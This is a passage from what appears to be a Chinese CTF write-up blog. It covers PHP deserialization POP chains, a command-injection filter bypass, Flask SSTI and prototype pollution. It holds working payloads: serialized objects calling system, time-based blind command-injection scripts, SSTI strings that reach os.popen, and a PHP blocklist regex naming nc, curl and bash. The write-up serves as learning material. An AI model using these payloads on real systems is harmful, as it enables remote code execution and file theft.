function __construct()</span><br><span class="line"> </span><br><span class="line">    &#123;</span><br><span class="line"> </span><br><span class="line">        $s=new Super();</span><br><span class="line"> </span><br><span class="line">        $this-&gt;func=$s;</span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        ($this-&gt;func)();//这里把Super当函数调用，实际触发了Super()里面的__invoke方法</span><br><span class="line">        return &quot;Good Job!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">class Handle&#123;</span><br><span class="line">    protected $obj;</span><br><span class="line">public function __construct()</span><br><span class="line"> </span><br><span class="line">    &#123;</span><br><span class="line"> </span><br><span class="line">        $this-&gt;obj=new CTF();//实例化CTF（）后给这里的obj赋值</span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    public function __call($func, $vars)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;obj-&gt;end();//调用了CTF（）里的end()方法</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">class Super&#123;</span><br><span class="line">    protected $obj;</span><br><span class="line">public function __construct()</span><br><span class="line"> </span><br><span class="line">    &#123;</span><br><span class="line"> </span><br><span class="line">        $this-&gt;obj=new Handle();//为protected $obj赋值</span><br><span class="line">    &#125;</span><br><span class="line">    public function __invoke()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;obj-&gt;getStr();//Handle 类没有定义 getStr() 方法，因此在调用这个方法时会触发 handle里的__call() 魔术方法</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    public function end()</span><br><span class="line">    &#123;</span><br><span class="line">        die(&quot;==GAME OVER==&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">class CTF&#123;</span><br><span class="line">    public $handle;</span><br><span class="line"> </span><br><span class="line">    public function __construct()</span><br><span class="line"> </span><br><span class="line">    &#123;</span><br><span class="line"> </span><br><span class="line">        $w=new WhiteGod();</span><br><span class="line"> </span><br><span class="line">        $this-&gt;handle=$w;</span><br><span class="line"> </span><br><span class="line">    &#125; </span><br><span class="line">    public function end()</span><br><span class="line">    &#123;</span><br><span class="line">        unset($this-&gt;handle-&gt;log);//在这个end()方法中我们试图用unset（）删除WhiteGod()里面的log属性</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">class WhiteGod&#123;</span><br><span class="line">    public $func=&#x27;system&#x27;;</span><br><span class="line">    public $var=&quot;cat /flag&quot;;</span><br><span class="line"> </span><br><span class="line">    public function __unset($var)</span><br><span class="line">    &#123;</span><br><span class="line">        ($this-&gt;func)($this-&gt;var);    </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$b=new Begin();</span><br><span class="line">$b-&gt;name=new Then();</span><br><span class="line">echo urlencode(serialize($b)); </span><br></pre></td></tr></table></figure><p>需要注意的是一些类中有保护或私有属性的成员，因此需要对序列化数据进行URL编码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">需要特别注意的是在执行 unset($this-&gt;handle-&gt;log) 时，会尝试调用 $this-&gt;handle 对象的 __unset() 魔术方法。该方法将使用属性 $this-&gt;func 的值作为可调用函数，并将属性 $this-&gt;var 的值作为参数来执行。</span><br><span class="line"></span><br><span class="line">因此，在 WhiteGod 类中调用 unset($this-&gt;handle-&gt;log) 将实际上执行 ($this-&gt;func)($this-&gt;var)，相当于执行 system(&#x27;ls /&#x27;)，即执行系统命令 ls /</span><br><span class="line"></span><br><span class="line">整体来说是：</span><br><span class="line"></span><br><span class="line">__destruct() 中，由于 $name 包含一个 Then 对象，会触发 __toString() 魔术方法。在 __toString() 方法中，首先调用 $this-&gt;func 属性指向的对象（即 Super 对象），接下来进入 Super 类，由于该类含有一个 __invoke() 魔术方法，因此在调用 Super 对象时会触发 __invoke() 方法。在 __invoke() 方法中，又会调用 $this-&gt;obj-&gt;getStr() 方法，并进入 Handle 类中。</span><br><span class="line"></span><br><span class="line">由于 Handle 类没有定义 getStr() 方法，因此在调用这个方法时会触发 __call() 魔术方法。在 __call() 方法中，将会调用 $this-&gt;obj-&gt;end() 方法，并触发 CTF 类中的 end() 方法。</span><br><span class="line"></span><br><span class="line">在 CTF 类的 end() 方法中，我们会调用 unset($this-&gt;handle-&gt;log)，从而触发 WhiteGod 类的 __unset() 魔术方法。在 __unset() 方法中，我们构造了一个命令行字符串，然后通过执行漏洞执行了系统命令。</span><br></pre></td></tr></table></figure><p>得到payload:</p><p>pop&#x3D;O%3A5%3A%22Begin%22%3A1%3A%7Bs%3A4%3A%22name%22%3BO%3A4%3A%22Then%22%3A1%3A%7Bs%3A10%3A%22%00Then%00func%22%3BO%3A5%3A%22Super%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00obj%22%3BO%3A6%3A%22Handle%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00obj%22%3BO%3A3%3A%22CTF%22%3A1%3A%7Bs%3A6%3A%22handle%22%3BO%3A8%3A%22WhiteGod%22%3A2%3A%7Bs%3A4%3A%22func%22%3Bs%3A8%3A%22readfile%22%3Bs%3A3%3A%22var%22%3Bs%3A5%3A%22%2Fflag%22%3B%7D%7D%7D%7D%7D%7D</p><p><img src="https://bu.dusays.com/2024/05/13/6641fa964f3ae.png" alt="image-20240201202421115"></p><p>其实我觉得我应该重学一下反序列化漏洞 忘得太多了 太不熟练了</p><p>过年那周重学一下吧</p><h3 id="R-C-E-1"><a href="#R-C-E-1" class="headerlink" title="R!!!C!!!E!!!"></a>R!!!C!!!E!!!</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">minipop</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$qwejaskdjnlka</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\&gt;|\&lt;|nc|tee|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#x27;</span>, <span class="variable">$this</span>-&gt;code))&#123;</span><br><span class="line">            <span class="title function_ invoke__">exec</span>(<span class="variable">$this</span>-&gt;code);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;alright&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;qwejaskdjnlka;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;payload&#x27;</span>]))&#123;</span><br><span class="line">    <span class="comment">//wanna try?</span></span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;payload&#x27;</span>]);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p><code>tee</code>命令用于从标准输入读取数据，并将其写入一个或多个文件 tee的作用是把查询到的根目录写入到当前网页下的某文件 再次访问该文件即可得到被打印的根目录</p><p><code>tee</code>通常后面会跟着要写入的文件名</p><p>script a：<code>script</code> 是一个Unix&#x2F;Linux命令，用于记录终端会话。当你运行 <code>script</code> 命令时，它会开始记录你在终端中的所有活动，直到你停止它。<code>a</code> 是 <code>script</code> 命令的一个选项，表示将输出追加到一个文件中，而不是覆盖它。如果文件不存在，它会被创建；如果文件已经存在，新的输出会被追加到文件的末尾。</p><p>Shell是一个通用术语，指的是用户与操作系统内核之间的交互界面。它是一个命令解释器，允许用户通过键盘输入命令来与操作系统进行交互。Shell提供了一种执行命令、控制进程、文件操作等的途径，可以是交互式的也可以是脚本式的。</p><p>Bash是一种Unix Shell，是Bourne Again SHell的缩写。它是Bourne Shell的增强版本，在功能上扩展了Bourne Shell，同时兼容POSIX标准。Bash支持命令行编辑、命令历史、条件测试、循环结构等高级特性，使得脚本编写更加方便。</p><p><strong>简单来说，Shell是一个广义的概念，Bash是Shell的一种具体实现。</strong></p><p>所以 用ls &#x2F; | t’’ee b的方法进行查看</p><p>也可以用ls &#x2F; |script a  跟ls &#x2F; | t’’ee b作用是一样的</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">minipop</span></span>&#123;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>=<span class="string">&quot;ls / | t&#x27;&#x27;ee b&quot;</span>;<span class="comment">//”ls / |script a“</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$qwejaskdjnlka</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">minipop</span>();</span><br><span class="line"> </span><br><span class="line"><span class="variable">$b</span>= <span class="keyword">new</span> <span class="title function_ invoke__">minipop</span>(); <span class="comment">//调用两次</span></span><br><span class="line"><span class="variable">$b</span>-&gt;qwejaskdjnlka=<span class="variable">$a</span>;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>);</span><br><span class="line"> </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>结果O:7:”minipop”:2:{s:4:”code”;s:14:”ls &#x2F; | t’’ee b”;s:13:”qwejaskdjnlka”;O:7:”minipop”:2:{s:4:”code”;s:14:”ls &#x2F; | t’’ee b”;s:13:”qwejaskdjnlka”;N;}}</p><p><img src="https://bu.dusays.com/2024/05/13/6641fa967a651.png" alt="image-20240201211829175"></p><p>访问文件b  访问a</p><p><img src="https://bu.dusays.com/2024/05/13/6641fa950dcce.png" alt="image-20240201211918373"></p><p>发现flag所在文件</p><p>直接cat &#x2F;flag_is_h3eeere</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">minipop</span></span>&#123;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>=<span class="string">&quot;cat /flag_is_h3eeere|t&#x27;&#x27;ee b&quot;</span>;<span class="comment">//&quot; cat /flag_is_h3eeere|script a&quot;</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$qwejaskdjnlka</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">minipop</span>();</span><br><span class="line"> </span><br><span class="line"><span class="variable">$b</span>= <span class="keyword">new</span> <span class="title function_ invoke__">minipop</span>(); <span class="comment">//调用两次</span></span><br><span class="line"><span class="variable">$b</span>-&gt;qwejaskdjnlka=<span class="variable">$a</span>;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>);</span><br><span class="line"> </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>结果</p><p>O:7:”minipop”:2:{s:4:”code”;s:28:”cat &#x2F;flag_is_h3eeere|t’’ee b”;s:13:”qwejaskdjnlka”;O:7:”minipop”:2:{s:4:”code”;s:28:”cat &#x2F;flag_is_h3eeere|t’’ee b”;s:13:”qwejaskdjnlka”;N;}}</p><p><img src="https://bu.dusays.com/2024/05/13/6641fa9747e25.png" alt="image-20240201212214441"></p><p>再查看文件b或a</p><p><img src="https://bu.dusays.com/2024/05/13/6641fa9443648.png" alt="image-20240201212238787"></p><p><img src="https://bu.dusays.com/2024/05/13/6641fa975c099.png" alt="image-20240201212705906"></p><p>官方说这考点本来应该是bash盲注 没太看懂</p><p>Bash盲注是一种针对Bash shell的注入攻击，攻击者尝试利用Bash的某些特性来执行恶意命令或获取敏感信息。</p><p>在Bash中，用户输入的命令会被解析和执行。攻击者可能会尝试利用Bash的输入验证不严格、命令替换等特性，注入恶意代码，导致意外的行为或泄露敏感信息</p><p>这道题脚本</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://bcdad1a5-6014-4594-a8b5-c4c03f581147.node4.buuoj.cn:81/&quot;</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">15</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">        <span class="comment">#ascii码表</span></span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">            k=<span class="built_in">chr</span>(k)</span><br><span class="line">            payload =<span class="string">f&quot;if [ `cat /flag_is_h3eeere | awk NR==<span class="subst">&#123;i&#125;</span> | cut -c <span class="subst">&#123;j&#125;</span>` == &#x27;<span class="subst">&#123;k&#125;</span>&#x27; ];then sleep 2;fi&quot;</span></span><br><span class="line">            length=<span class="built_in">len</span>(payload)</span><br><span class="line">            payload2 =&#123;</span><br><span class="line">                <span class="string">&quot;payload&quot;</span>: <span class="string">&#x27;O:7:&quot;minipop&quot;:2:&#123;&#123;s:4:&quot;code&quot;;N;s:13:&quot;qwejaskdjnlka&quot;;O:7:&quot;minipop&quot;:2:&#123;&#123;s:4:&quot;code&quot;;s:&#123;0&#125;:&quot;&#123;1&#125;&quot;;s:13:&quot;qwejaskdjnlka&quot;;N;&#125;&#125;&#125;&#125;&#x27;</span>.<span class="built_in">format</span>(length,payload)</span><br><span class="line">            &#125;</span><br><span class="line">            t1=time.time()</span><br><span class="line">            r=requests.post(url=url,data=payload2)</span><br><span class="line">            t2=time.time()</span><br><span class="line">            <span class="keyword">if</span> t2-t1 &gt;<span class="number">1.5</span>:</span><br><span class="line">                result+=k</span><br><span class="line">                <span class="built_in">print</span>(result)</span><br><span class="line">    result += <span class="string">&quot; &quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/13/6641fa9597b14.png" alt="image-20240201215218834"></p><p>其他base盲注脚本</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time <span class="keyword">as</span> t</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote <span class="keyword">as</span> urlen</span><br><span class="line">url  = <span class="string">&#x27;http://2505541e-7bbc-4055-b36b-00c8454b850e.challenge.ctf.show/?F=`$F%20`;&#x27;</span></span><br><span class="line">alphabet = [<span class="string">&#x27;&#123;&#x27;</span>,<span class="string">&#x27;&#125;&#x27;</span>, <span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;@&#x27;</span>, <span class="string">&#x27;-&#x27;</span>,<span class="string">&#x27;_&#x27;</span>,<span class="string">&#x27;=&#x27;</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;f&#x27;</span>,<span class="string">&#x27;j&#x27;</span>,<span class="string">&#x27;h&#x27;</span>,<span class="string">&#x27;i&#x27;</span>,<span class="string">&#x27;g&#x27;</span>,<span class="string">&#x27;k&#x27;</span>,<span class="string">&#x27;l&#x27;</span>,<span class="string">&#x27;m&#x27;</span>,<span class="string">&#x27;n&#x27;</span>,<span class="string">&#x27;o&#x27;</span>,<span class="string">&#x27;p&#x27;</span>,<span class="string">&#x27;q&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;t&#x27;</span>,<span class="string">&#x27;u&#x27;</span>,<span class="string">&#x27;v&#x27;</span>,<span class="string">&#x27;w&#x27;</span>,<span class="string">&#x27;x&#x27;</span>,<span class="string">&#x27;y&#x27;</span>,<span class="string">&#x27;z&#x27;</span>,<span class="string">&#x27;A&#x27;</span>,<span class="string">&#x27;B&#x27;</span>,<span class="string">&#x27;C&#x27;</span>,<span class="string">&#x27;D&#x27;</span>,<span class="string">&#x27;E&#x27;</span>,<span class="string">&#x27;F&#x27;</span>,<span class="string">&#x27;G&#x27;</span>,<span class="string">&#x27;H&#x27;</span>,<span class="string">&#x27;I&#x27;</span>,<span class="string">&#x27;J&#x27;</span>,<span class="string">&#x27;K&#x27;</span>,<span class="string">&#x27;L&#x27;</span>,<span class="string">&#x27;M&#x27;</span>,<span class="string">&#x27;N&#x27;</span>,<span class="string">&#x27;O&#x27;</span>,<span class="string">&#x27;P&#x27;</span>,<span class="string">&#x27;Q&#x27;</span>,<span class="string">&#x27;R&#x27;</span>,<span class="string">&#x27;S&#x27;</span>,<span class="string">&#x27;T&#x27;</span>,<span class="string">&#x27;U&#x27;</span>,<span class="string">&#x27;V&#x27;</span>,<span class="string">&#x27;W&#x27;</span>,<span class="string">&#x27;X&#x27;</span>,<span class="string">&#x27;Y&#x27;</span>,<span class="string">&#x27;Z&#x27;</span>,<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;5&#x27;</span>,<span class="string">&#x27;6&#x27;</span>,<span class="string">&#x27;7&#x27;</span>,<span class="string">&#x27;8&#x27;</span>,<span class="string">&#x27;9&#x27;</span>]</span><br><span class="line"></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line"><span class="keyword">for</span> char <span class="keyword">in</span> alphabet:</span><br><span class="line"><span class="comment"># payload = &quot;if [ `ls  | grep &#x27;flag&#x27; |cut -c&#123;&#125;` = &#x27;&#123;&#125;&#x27; ];then sleep 5;fi&quot;.format(i,char) #flag.php</span></span><br><span class="line">payload = <span class="string">&quot;if [ `cat flag.php | grep &#x27;flag&#x27; |cut -c&#123;&#125;` = &#x27;&#123;&#125;&#x27; ];then sleep 5;fi&quot;</span>.<span class="built_in">format</span>(i,char)</span><br><span class="line"><span class="comment"># data = &#123;&#x27;cmd&#x27;:payload&#125;</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">start = <span class="built_in">int</span>(t.time())</span><br><span class="line">r = requests.get(url+payload)</span><br><span class="line"><span class="comment"># r = requests.post(url, data=data)</span></span><br><span class="line">end = <span class="built_in">int</span>(t.time()) - start</span><br><span class="line"><span class="keyword">if</span> end &gt;= <span class="number">3</span>:</span><br><span class="line">result += char</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Flag: &quot;</span>+result)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line"><span class="built_in">print</span>(e)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>其实对base盲注还是不太明白 QAQ</p><p>解释：</p><p>Bash盲注<br>截取比较<br>参考 <a href="https://www.cnblogs.com/kiko2014551511/p/11531558.html">https://www.cnblogs.com/kiko2014551511/p/11531558.html</a></p><p>cat &#x2F;flag | cut -c (截取第几位)</p><p>${string:start:length} 从字符串左边开始计数</p><p>string为要截取的字符串，start是起始位置（从左边开始，从0开始计数），length是要截取的长度(省略的话表示直到字符串的末尾)</p><p>${string:0-start:length} 从右边开始计数<br>同从左边开始计数相比，这种格式仅仅多了0-，这是固定的写法，专门用来标识从字符串右边开始计数</p><p>注意点：</p><p>从左边开始计数时，起始数字是0；<br>从右边开始计数时，起始数字是1<br>不管从哪边计数，截取方向都是从左到右</p><p>延时<br>sleep 5 </p><p>只找到这一篇解释 懵逼</p><h3 id="GenShin"><a href="#GenShin" class="headerlink" title="GenShin"></a>GenShin</h3><p><img src="https://bu.dusays.com/2024/05/13/6641fa949f492.png" alt="image-20240201225109579"></p><p>f12 在网络中发现奇怪的地方</p><p><img src="https://bu.dusays.com/2024/05/13/6641fa97ecc4e.png" alt="image-20240201225202549"></p><p>发现secr3tofpop   可能是个文件</p><p>查一下</p><p><img src="https://bu.dusays.com/2024/05/13/6641fa93dfd63.png" alt="image-20240201225256182"></p><p>让我们get传一个name</p><p><img src="https://bu.dusays.com/2024/05/13/6641fa9549f52.png" alt="image-20240201225407225"></p><p>传admin 回显admin</p><p>可能是ssti</p><p>传<code>&#123;%print(7*7)%&#125;</code></p><p><img src="https://bu.dusays.com/2024/05/13/6641fa96efcd3.png" alt="image-20240201225538869"></p><p>回显49   是ssti</p><p>查看config 看看key 没有，那考点应该不是爆破 查看一下子类</p><p><img src="https://bu.dusays.com/2024/05/13/6641fa9809428.png" alt="image-20240201232337950"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;%print&quot;&quot;|attr(&quot;__class__&quot;)|attr(&quot;__base__&quot;)|attr(&quot;__subclasses__&quot;)()%&#125;</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/13/6641fa962497c.png" alt="image-20240201232510988"></p><p>找os模块</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;%print&quot;&quot;|attr(&quot;__class__&quot;)|attr(&quot;__base__&quot;)|attr(&quot;__subclasses__&quot;)()|attr(132)|attr(&quot;__in&quot;+&quot;it__&quot;)|attr(&quot;__globals__&quot;)%&#125;</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/13/6641fa96314b5.png" alt="image-20240201233511794"></p><p>找到eval</p><p>不能使用system函数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eval(__import__(&#x27;os&#x27;).popen(&#x27;ls /&#x27;).read())</span><br><span class="line"></span><br><span class="line">所以发现flag之后也是一样的改为__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read() </span><br></pre></td></tr></table></figure><p>然后对它进行chr编码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;%print&quot;&quot;|attr(&quot;__class__&quot;)|attr(&quot;__base__&quot;)|attr(&quot;__subclasses__&quot;)()|attr(132)|attr(&quot;__in&quot;+&quot;it__&quot;)|attr(&quot;__globals__&quot;)|attr(&quot;get&quot;)(&quot;__builtins__&quot;)|attr(&quot;get&quot;)(&quot;eval&quot;)(&quot;eval(chr(95)%2bchr(95)%2bchr(105)%2bchr(109)%2bchr(112)%2bchr(111)%2bchr(114)%2bchr(116)%2bchr(95)%2bchr(95)%2bchr(40)%2bchr(39)%2bchr(111)%2bchr(115)%2bchr(39)%2bchr(41)%2bchr(46)%2bchr(112)%2bchr(111)%2bchr(112)%2bchr(101)%2bchr(110)%2bchr(40)%2bchr(39)%2bchr(99)%2bchr(97)%2bchr(116)%2bchr(32)%2bchr(47)%2bchr(102)%2bchr(108)%2bchr(97)%2bchr(103)%2bchr(39)%2bchr(41)%2bchr(46)%2bchr(114)%2bchr(101)%2bchr(97)%2bchr(100)%2bchr(40)%2bchr(41))&quot;)%&#125;</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/13/6641fa98a71c2.png" alt="image-20240201234041082"></p><p>flag{44f974fa-5970-49dd-aba8-4b9bdf9c5bdf}    </p><p>也可以用get_flashed_message()</p><p><code>get_flashed_messages()</code> 是一个在 Flask web 框架中用于处理 flash 消息的函数。Flash 消息是一种在用户进行表单提交后显示的临时消息，通常用于通知用户关于表单提交的结果。</p><p>例如，如果你有一个表单，用户提交后你可能想要显示一个消息告诉他们表单已成功提交或出现了一些错误。Flash 消息就是用来实现这个目的的。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% print(get_flashed_messages.__globals__.os[&quot;pop&quot;+&quot;en&quot;](&quot;cat /flag&quot;).read()) %&#125;</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/13/6641fa944ca18.png" alt="image-20240201234319631"></p><h3 id="OtenkiGirl"><a href="#OtenkiGirl" class="headerlink" title="OtenkiGirl"></a>OtenkiGirl</h3><p>JavaScript 原型链污染</p><p><img src="https://bu.dusays.com/2024/05/13/6641fa9b28770.png" alt="image-20240202225439118"></p><p>还有这个网站的源码</p><p>有回显</p><p><img src="https://bu.dusays.com/2024/05/13/6641fa9d2432e.png" alt="image-20240202225622528"></p><p>bp抓包</p><p><img src="https://bu.dusays.com/2024/05/13/6642328723e81.png" alt="image-20240202230258106"></p><p>发现多了一个timestamp 时间戳</p><p>时间戳（Timestamp）通常表示某一时刻或事件发生的确切时间，这个时间通常以某种固定的格式被记录下来，以便于后续的处理、比较或排序。</p><p>一共发了五个包</p><p><img src="https://bu.dusays.com/2024/05/13/6641fa9a669c8.png" alt="image-20240202230849584"></p><p>其中向info发了时间戳</p><p>进一步尝试发现 不管发什么都会向info发时间戳</p><p>所以看看源码 info到底是干什么的</p><p><img src="https://bu.dusays.com/2024/05/13/6641fa954c2c0.png" alt="image-20240202233059552"></p><p>先看看基础的app.js</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> env = <span class="variable language_">global</span>.<span class="property">env</span> = (process.<span class="property">env</span>.<span class="property">NODE_ENV</span> || <span class="string">&quot;production&quot;</span>).<span class="title function_">trim</span>();</span><br><span class="line"><span class="keyword">const</span> isEnvDev = <span class="variable language_">global</span>.<span class="property">isEnvDev</span> = env === <span class="string">&quot;development&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">devOnly</span> = (<span class="params">fn</span>) =&gt; isEnvDev ? (<span class="keyword">typeof</span> fn === <span class="string">&quot;function&quot;</span> ? <span class="title function_">fn</span>() : fn) : <span class="literal">undefined</span></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">CONFIG</span> = <span class="built_in">require</span>(<span class="string">&quot;./config&quot;</span>), <span class="variable constant_">DEFAULT_CONFIG</span> = <span class="built_in">require</span>(<span class="string">&quot;./config.default&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">PORT</span> = <span class="variable constant_">CONFIG</span>.<span class="property">server_port</span> || <span class="variable constant_">DEFAULT_CONFIG</span>.<span class="property">server_port</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&quot;path&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> <span class="title class_">Koa</span> = <span class="built_in">require</span>(<span class="string">&quot;koa&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">&quot;koa-bodyparser&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title class_">Koa</span>();</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(<span class="built_in">require</span>(<span class="string">&#x27;koa-static&#x27;</span>)(path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;./static&#x27;</span>)));</span><br><span class="line"><span class="title function_">devOnly</span>(<span class="function"><span class="params">_</span> =&gt;</span> <span class="built_in">require</span>(<span class="string">&quot;./webpack.proxies.dev&quot;</span>).<span class="title function_">forEach</span>(<span class="function"><span class="params">p</span> =&gt;</span> app.<span class="title function_">use</span>(p)));</span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">bodyParser</span>(&#123;</span><br><span class="line">    <span class="attr">onerror</span>: <span class="keyword">function</span> (<span class="params">err, ctx</span>) &#123;</span><br><span class="line">        <span class="comment">// If the json is invalid, the body will be set to &#123;&#125;. That means, the request json would be seen as empty.</span></span><br><span class="line">        <span class="keyword">if</span> (err.<span class="property">status</span> === <span class="number">400</span> &amp;&amp; err.<span class="property">name</span> === <span class="string">&#x27;SyntaxError&#x27;</span> &amp;&amp; ctx.<span class="property">request</span>.<span class="property">type</span> === <span class="string">&#x27;application/json&#x27;</span>) &#123;</span><br><span class="line">            ctx.<span class="property">request</span>.<span class="property">body</span> = &#123;&#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> err;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;));</span><br><span class="line"></span><br><span class="line">[</span><br><span class="line">    <span class="string">&quot;info&quot;</span>,</span><br><span class="line">    <span class="string">&quot;submit&quot;</span></span><br><span class="line">].<span class="title function_">forEach</span>(<span class="function"><span class="params">p</span> =&gt;</span> &#123; p = <span class="built_in">require</span>(<span 